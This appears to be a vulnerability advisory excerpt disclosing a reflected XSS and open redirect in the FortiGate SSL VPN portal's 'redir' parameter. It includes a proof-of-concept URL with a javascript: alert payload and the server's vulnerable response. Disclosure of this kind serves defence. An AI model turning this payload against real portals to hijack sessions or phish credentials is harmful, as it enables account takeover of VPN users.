Vulnerability overview/description:
-----------------------------------
The FortiGate SSL VPN Portal is prone to a reflected cross-site scripting (XSS)
vulnerability. The HTTP GET parameter "redir" is vulnerable.
An attacker can exploit this vulnerability by tricking a victim to visit a URL.
The attacker is able to hijack the session of the attacked user, and use this
vulnerability in the course of spear-phishing attacks, e.g. by displaying a
login prompt that sends credentials of victim back to the attacker.

Note: This vulnerability is also an open redirect and is very similar to a
vulnerability that was fixed in FortiOS in March 2016 (FG-IR-16-004).

Proof of concept:
-----------------
The following request exploits the issue:
https://vpn.<SERVER>.com/remote/loginredir?redir=javascript:alert(%22XSS%20%22%2Bdocument.location)


The server responds with a page that looks as follows:
---------------------------------------------------------------------------------------------------
<html><head>
<script language="javascript">
document.location=decodeURIComponent("javascript%3Aalert%28%22XSS%20%22%2Bdocument.location%29");
</script>
</head></html>
---------------------------------------------------------------------------------------------------
